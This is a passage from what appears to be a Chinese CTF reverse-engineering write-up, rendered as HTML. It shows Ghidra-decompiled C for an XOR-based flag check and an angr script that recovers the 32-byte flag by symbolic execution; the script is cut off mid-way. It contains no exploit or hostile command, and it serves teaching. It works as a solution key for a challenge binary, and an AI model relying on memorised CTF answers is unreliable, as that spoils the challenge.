style="--0:#E1E4E8;--1:#24292E">local_120 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">3a0000000e</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_118 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">410000006a</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_110 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">5700000040</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_108 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">3400000008</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_100 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">b0000003c</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_f8 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">3400000003</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_f0 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">4600000028</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_e8 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">530000005f</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_e0 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">5000000010</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">local_15c </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">36</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">iVar1 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">_setjmp</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">&#x26;</span><span style="--0:#E1E4E8;--1:#24292E">local_d8);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> (iVar1 </span><span style="--0:#F97583;--1:#BF3441">==</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">lVar2 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">uVar3 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">41</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">while</span><span style="--0:#E1E4E8;--1:#24292E">( </span><span style="--0:#79B8FF;--1:#005CC5">true</span><span style="--0:#E1E4E8;--1:#24292E"> ) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">      </span></span><span style="--0:#E1E4E8;--1:#24292E">local_15c </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> local_15c </span><span style="--0:#F97583;--1:#BF3441">^</span><span style="--0:#E1E4E8;--1:#24292E"> uVar3;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span class="indent">      </span><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> ((</span><span style="--0:#F97583;--1:#BF3441">int</span><span style="--0:#E1E4E8;--1:#24292E">)(</span><span style="--0:#F97583;--1:#BF3441">char</span><span style="--0:#E1E4E8;--1:#24292E">)</span><span style="--0:#FFAB70;--1:#AE4B07">FLAG</span><span style="--0:#E1E4E8;--1:#24292E">[lVar2] </span><span style="--0:#F97583;--1:#BF3441">!=</span><span style="--0:#E1E4E8;--1:#24292E"> local_15c) {</span></div></div><div class="ec-line" style="--ecIndent:20ch"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span class="indent"><span style="--0:#99A0A6;--1:#616972">                    </span></span><span style="--0:#99A0A6;--1:#616972">/* WARNING: Subroutine does not return */</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code"><span class="indent">        </span><span style="--0:#B392F0;--1:#6F42C1">__longjmp_chk</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">&#x26;</span><span style="--0:#E1E4E8;--1:#24292E">local_d8,</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">54</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">      </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">55</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">      </span></span><span style="--0:#E1E4E8;--1:#24292E">lVar2 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> lVar2 </span><span style="--0:#F97583;--1:#BF3441">+</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">56</div></div><div class="code"><span class="indent">      </span><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> (lVar2 </span><span style="--0:#F97583;--1:#BF3441">==</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">20</span><span style="--0:#E1E4E8;--1:#24292E">) </span><span style="--0:#F97583;--1:#BF3441">break</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">57</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">      </span></span><span style="--0:#E1E4E8;--1:#24292E">uVar3 </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#FFAB70;--1:#AE4B07">auStack344</span><span style="--0:#E1E4E8;--1:#24292E">[lVar2];</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">58</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">59</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972">// addr: 0x13f5</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">60</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">puts</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"Well Done."</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">61</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">62</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">else</span><span style="--0:#E1E4E8;--1:#24292E"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">63</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972">// addr: 0x1414</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">64</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">puts</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"Nope."</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">65</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">66</div></div><div class="code"><span class="indent">  </span><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> (local_10 </span><span style="--0:#F97583;--1:#BF3441">==</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">long</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span><span style="--0:#E1E4E8;--1:#24292E">)(in_FS_OFFSET </span><span style="--0:#F97583;--1:#BF3441">+</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">28</span><span style="--0:#E1E4E8;--1:#24292E">)) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">67</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">return</span><span style="--0:#E1E4E8;--1:#24292E">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">68</div></div><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">  </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line" style="--ecIndent:20ch"><div class="gutter"><div class="ln" aria-hidden="true">69</div></div><div class="code"><span class="indent"><span style="--0:#99A0A6;--1:#616972">                    </span></span><span style="--0:#99A0A6;--1:#616972">/* WARNING: Subroutine does not return */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">70</div></div><div class="code"><span class="indent">  </span><span style="--0:#B392F0;--1:#6F42C1">__stack_chk_fail</span><span style="--0:#E1E4E8;--1:#24292E">();</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">71</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="void __stack_chk_fail(void){  int iVar1;  long lVar2;  uint uVar3;  long in_FS_OFFSET;  uint local_15c;  uint auStack344 [2];  undefined8 local_150;  undefined8 local_148;  undefined8 local_140;  undefined8 local_138;  undefined8 local_130;  undefined8 local_128;  undefined8 local_120;  undefined8 local_118;  undefined8 local_110;  undefined8 local_108;  undefined8 local_100;  undefined8 local_f8;  undefined8 local_f0;  undefined8 local_e8;  undefined8 local_e0;  __jmp_buf_tag local_d8;  long local_10;  local_10 = *(long *)(in_FS_OFFSET + 0x28);  auStack344[1] = 0x14;  local_150 = 0x1200000017;  local_148 = 0x500000001d;  local_140 = 0x5d00000046;  local_138 = 0x4100000042;  local_130 = 0x330000006c;  local_128 = 0x5a0000005d;  local_120 = 0x3a0000000e;  local_118 = 0x410000006a;  local_110 = 0x5700000040;  local_108 = 0x3400000008;  local_100 = 0xb0000003c;  local_f8 = 0x3400000003;  local_f0 = 0x4600000028;  local_e8 = 0x530000005f;  local_e0 = 0x5000000010;  local_15c = 0x36;  iVar1 = _setjmp(&#x26;local_d8);  if (iVar1 == 0) {    lVar2 = 0;    uVar3 = 0x41;    while( true ) {      local_15c = local_15c ^ uVar3;      if ((int)(char)FLAG[lVar2] != local_15c) {                    /* WARNING: Subroutine does not return */        __longjmp_chk(&#x26;local_d8,1);      }      lVar2 = lVar2 + 1;      if (lVar2 == 0x20) break;      uVar3 = auStack344[lVar2];    }    // addr: 0x13f5    puts(&#x22;Well Done.&#x22;);  }  else {    // addr: 0x1414    puts(&#x22;Nope.&#x22;);  }  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {    return;  }                    /* WARNING: Subroutine does not return */  __stack_chk_fail();}"><div></div></button></div></figure></div>
<p>如果不想手动分析(这个分析相对来说也不是很困难?)也可以用 <code>Angr</code></p>
<div class="expressive-code"><figure class="frame has-title"><figcaption class="header"><span class="title">solve.py</span></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:101ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> angr</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> sys</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> claripy</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">def</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">is_successful</span><span style="--0:#E1E4E8;--1:#24292E">(state):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">global</span><span style="--0:#E1E4E8;--1:#24292E"> flag</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972"># 检查 stdout 有没有 Well Done 字段</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">return</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">b</span><span style="--0:#9ECBFF;--1:#032F62">'Well Done'</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">in</span><span style="--0:#E1E4E8;--1:#24292E"> state.posix.dumps(</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">def</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">should_abort</span><span style="--0:#E1E4E8;--1:#24292E">(state):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972"># 检查控制台 stdout 有没有 Nope 字段</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">return</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">b</span><span style="--0:#9ECBFF;--1:#032F62">'Nope'</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">in</span><span style="--0:#E1E4E8;--1:#24292E"> state.posix.dumps(</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 加载二进制文件, 当我们分析的二进制没有受外部库显著的影响时, 可以关掉 auto_load_libs</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">project </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> angr.Project(</span><span style="--0:#9ECBFF;--1:#032F62">"F:/Downloads/homework_help"</span><span style="--0:#E1E4E8;--1:#24292E">, </span><span style="--0:#FFAB70;--1:#AE4B07">auto_load_libs</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">False</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(project.loader.find_symbol(</span><span style="--0:#9ECBFF;--1:#032F62">"__stack_chk_fail"</span><span style="--0:#E1E4E8;--1:#24292E">).rebased_addr)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 从这个方法开始执行</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">state </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> project.factory.blank_state(</span><span style="--0:#FFAB70;--1:#AE4B07">addr</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E">project.loader.find_symbol(</span><span style="--0:#9ECBFF;--1:#032F62">"__stack_chk_fail"</span><span style="--0:#E1E4E8;--1:#24292E">).rebased_addr)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 把 FLAG 变量当作一个 solver 的变量, 我们目的就是让 Angr 构造一个合适的 FLAG 来达到 is_successful 条件</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 第一个是自定义名字, 可以随意, 第二个参数是长度, 通过 Ghidra 可以看到程序中为 32 bytes 长, 也就是 32 * 8 bits 长</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">flag </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> state.solver.BVS(</span><span style="--0:#9ECBFF;--1:#032F62">'FLAG'</span><span style="--0:#E1E4E8;--1:#24292E">, </span><span style="--0:#79B8FF;--1:#005CC5">32</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">8</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># FLAG addr</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(project.loader.find_symbol(</span><span style="--0:#9ECBFF;--1:#032F62">"FLAG"</span><span style="--0:#E1E4E8;--1:#24292E">).rebased_addr)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 把 FLAG 填充到全局 FLAG 符号的内存位置里</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">state.memory.store(project.loader.find_symbol(</span><span style="--0:#9ECBFF;--1:#032F62">"FLAG"</span><span style="--0:#E1E4E8;--1:#24292E">).rebased_addr, flag)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 构造一个模拟器</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">simulation </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> project.factory.simulation_manager(state)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 优化用的, 去掉也没事应该</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">simulation.one_active.options.add(angr.options.</span><span style="--0:#79B8FF;--1:#005CC5">LAZY_SOLVES</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 这里同时用 puts("Well Done.") 和 puts("Nope.") 本身的地址和控制台输出检查作为 find 条件, 实际上可以只使用一个</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">simulation.explore(</span><span style="--0:#FFAB70;--1:#AE4B07">find</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E">[is_successful, </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">004013f5</span><span style="--0:#E1E4E8;--1:#24292E">] , </span><span style="--0:#FFAB70;--1:#AE4B07">avoid</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E">[should_abort, </span><span style="--0:#F97583;--1:#BF3441">0x</span><span style="--0:#79B8FF;--1:#005CC5">401414</span><span style="--0:#E1E4E8;--1:#24292E">])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">for</span><span style="--0:#E1E4E8;--1:#24292E"> deadended </span><span style="--0:#F97583;--1:#BF3441">in</span><span style="--0:#E1E4E8;--1:#24292E"> simulation.deadended:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent">    </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"Valid memory access triggered by </span><span style="--0:#79B8FF;--1:#005CC5">%s</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">%</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">repr</span><span style="--0:#E1E4E8;--1:#24292E">(deadended.posix.dumps(</span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">for</span><span style="--0:#E1E4E8;--1:#24292E"> errored </span><span style="--0:#F97583;--1:#BF3441">in</span><span style="--0:#E1E4E8;--1:#24292E"> simulation.errored:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span class="indent">    </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#79B8FF;--1:#005CC5">%s</span><span style="--0:#9ECBFF;--1:#032F62"> caused by </span><span style="--0:#79B8FF;--1:#005CC5">%s</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">%</span><span style="--0:#E1E4E8;--1:#24292E"> (errored.error, </span><span style="--0:#79B8FF;--1:#005CC5">repr</span><span style="--0:#E1E4E8;--1:#24292E">(errored.state.posix.dumps(</span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">))))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code">
